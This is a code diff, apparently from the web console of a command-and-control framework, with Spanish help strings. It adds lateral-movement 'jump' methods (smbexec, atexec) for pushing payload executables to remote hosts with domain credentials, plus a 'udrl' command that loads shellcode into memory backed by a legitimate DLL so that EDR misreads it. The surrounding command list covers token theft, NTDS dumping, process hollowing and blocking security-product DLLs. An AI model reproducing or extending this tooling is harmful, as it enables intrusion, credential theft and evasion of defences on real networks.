@@ -5052,12 +5052,14 @@ const AC_COMMANDS = [
   ['winrm exec','winrm exec <t> <u> <p> <cmd>'],
   ['winrm deploy','winrm deploy <t> <u> <p> <cradle>'],
   // ── Lateral movement (stage + exec in one shot) ──────────────────────────
-  ['jump','jump <psexec|wmi|winrm|ssh|dcom> <host> <payload.exe> [user] [pass]'],
-  ['jump psexec', 'jump psexec <host> <payload.exe> [DOMAIN\\user] [pass]  — SMB admin$ + SCM service'],
-  ['jump wmi',    'jump wmi    <host> <payload.exe> [DOMAIN\\user] [pass]  — SMB C$ + WMI Win32_Process'],
-  ['jump winrm',  'jump winrm  <host> <payload.exe> [DOMAIN\\user] [pass]  — SMB C$ + Invoke-Command'],
-  ['jump ssh',    'jump ssh    <host> <payload.exe> <user> <pass>         — SCP upload + SSH exec (Linux targets)'],
-  ['jump dcom',   'jump dcom   <host> <payload.exe> [DOMAIN\\user] [pass] — SMB + MMC20.Application DCOM'],
+  ['jump','jump <psexec|wmi|winrm|ssh|dcom|smbexec|atexec> <host> <payload.exe> [user] [pass]'],
+  ['jump psexec',  'jump psexec  <host> <payload.exe> [DOMAIN\\user] [pass] — SMB admin$ + SCM service (SERVICES→agent)'],
+  ['jump wmi',     'jump wmi     <host> <payload.exe> [DOMAIN\\user] [pass] — SMB C$ + WMI Win32_Process::Create'],
+  ['jump winrm',   'jump winrm   <host> <payload.exe> [DOMAIN\\user] [pass] — SMB C$ + WinRM Invoke-Command'],
+  ['jump ssh',     'jump ssh     <host> <payload.exe> <user> <pass>         — SCP upload + SSH exec (Linux targets)'],
+  ['jump dcom',    'jump dcom    <host> <payload.exe> [DOMAIN\\user] [pass] — SMB + MMC20.Application DCOM'],
+  ['jump smbexec', 'jump smbexec <host> <payload.exe> [DOMAIN\\user] [pass] — SMB + cmd.exe service (SERVICES→cmd→agent, sin IOC de binario como servicio)'],
+  ['jump atexec',  'jump atexec  <host> <payload.exe> [DOMAIN\\user] [pass] — MS-TSCH scheduled task, runas SYSTEM, se autodestruye (impacket atexec style)'],
   ['token-store steal','token-store steal <pid> — robar token de proceso y guardar en store'],
   ['token-store use','token-store use <id> — usar token del store'],
   ['token-store show','token-store show — listar tokens guardados'],
@@ -5081,6 +5083,7 @@ const AC_COMMANDS = [
   ['ntds-dump','ntds-dump [outdir] — volcar ntds.dit vía ntdsutil (DA requerido)'],
   // New features
   ['hollow','hollow [target.exe] <shellcode.bin> — process hollowing (NtUnmapViewOfSection + inject + hijack)'],
+  ['udrl','udrl <shellcode.bin> — phantom DLL loading (shellcode en memoria respaldada por DLL legítima)'],
   ['blockdlls','blockdlls [on|off] — Microsoft-signed-only DLL policy (bloquea inyección de AV/EDR)'],
   ['blockdlls on','blockdlls on — activar política firma Microsoft (BLOCKDLLS)'],
   ['blockdlls off','blockdlls off — desactivar política firma Microsoft'],
@@ -5107,8 +5110,8 @@ const AC_WIN_ONLY = new Set([
   'ishell','ishell cmd','ishell ps','ishell exit',
   'link start','link stop',
   'winrm exec','winrm deploy',
-  'jump','jump psexec','jump wmi','jump winrm','jump ssh','jump dcom',
-  'hollow','blockdlls','blockdlls on','blockdlls off',
+  'jump','jump psexec','jump wmi','jump winrm','jump ssh','jump dcom','jump smbexec','jump atexec',
+  'hollow','udrl','blockdlls','blockdlls on','blockdlls off',
   'gen-lnk','com-hijack','com-hijack rm',
   'clip-monitor start','clip-monitor dump','clip-monitor stop',
   'token-store steal','token-store use','token-store show','token-store remove','token-store clear',
@@ -5142,6 +5145,7 @@ const AC_FILE_CMDS = new Map([
   ['clrstomp',      ['.exe', '.dll']],
   ['bof',           ['.o']],
   ['download',      null],
+  ['udrl',          ['.bin']],
 ]);
 
 async function acRefreshFiles() {
@@ -6448,22 +6452,25 @@ async function dispatchConsoleCmd(agentID, cmdLine) {
     case 'jump': {
       const lp = args.trim().split(/\s+/);
       const lMethod = (lp[0] || '').toLowerCase();
-      const validMethods = ['psexec','wmi','winrm','ssh','dcom'];
+      const validMethods = ['psexec','wmi','winrm','ssh','dcom','smbexec','smb','atexec','at'];
       if (!validMethods.includes(lMethod) || lp.length < 3) {
         addConsoleOutput(
           'uso: jump <método> <host> <payload.exe> [user] [pass]\n\n' +
           'Métodos:\n' +
-          '  psexec  — SMB admin$ + SCM service (Windows → Windows)\n' +
+          '  psexec  — SMB admin$ + SCM service (SERVICES→agent)\n' +
+          '  smbexec — SMB + cmd.exe como servicio (SERVICES→cmd→agent, sin binario como servicio)\n' +
+          '  atexec  — MS-TSCH scheduled task runas SYSTEM, se autodestruye\n' +
           '  wmi     — SMB C$ + WMI Win32_Process::Create\n' +
           '  winrm   — SMB C$ + PowerShell Invoke-Command\n' +
           '  dcom    — SMB + MMC20.Application DCOM ExecuteShellCommand\n' +
           '  ssh     — SCP upload + SSH exec (Windows → Linux/Unix)\n\n' +
           'Ejemplos:\n' +
-          '  jump psexec 10.7.10.22 agent.exe\n' +
-          '  jump psexec 10.7.10.22 agent.exe NORTH\\\\eddard.stark FightP3aceAndHonor!\n' +
-          '  jump wmi    10.7.10.22 agent.exe sevenkingdoms\\\\cersei.lannister il0vejaime\n' +
-          '  jump dcom   10.7.10.22 agent.exe NORTH\\\\jon.snow iknownothing\n' +
-          '  jump ssh    192.168.1.50 implant.elf root r00tpass',
+          '  jump psexec   10.7.10.22 agent.exe\n' +
+          '  jump smbexec  10.7.10.22 agent.exe NORTH\\\\eddard.stark FightP3aceAndHonor!\n' +
+          '  jump atexec   10.7.10.22 agent.exe sevenkingdoms\\\\cersei.lannister il0vejaime\n' +
+          '  jump wmi      10.7.10.22 agent.exe sevenkingdoms\\\\cersei.lannister il0vejaime\n' +
+          '  jump dcom     10.7.10.22 agent.exe NORTH\\\\jon.snow iknownothing\n' +
+          '  jump ssh      192.168.1.50 implant.elf root r00tpass',
           '', null);
         return;
       }
@@ -6500,6 +6507,25 @@ async function dispatchConsoleCmd(agentID, cmdLine) {
       // payload is the shellcode filename — server will load it
       // We encode as JSON for target, payload via standard Payload field
       taskArgs = JSON.stringify({target: hTarget, payload: hPayload});
+      break;
+    }
+
+    // ── Phantom DLL loading (UDRL / module stomping) ──────────────────────
+    // udrl <shellcode.bin>
+    case 'udrl': {
+      const payload = args.trim();
+      if (!payload) {
+        addConsoleOutput(
+          'uso: udrl <shellcode.bin>\n\n' +
+          'Carga shellcode en memoria respaldada por una DLL legítima del sistema.\n' +
+          'La región de memoria aparece al EDR como perteneciente a un módulo real.\n\n' +
+          'Ejemplo:\n' +
+          '  udrl shellcode.bin',
+          '', null);
+        return;
+      }
+      taskType = 'UDRL';
+      taskArgs = JSON.stringify({payload: payload});
       break;
     }
 
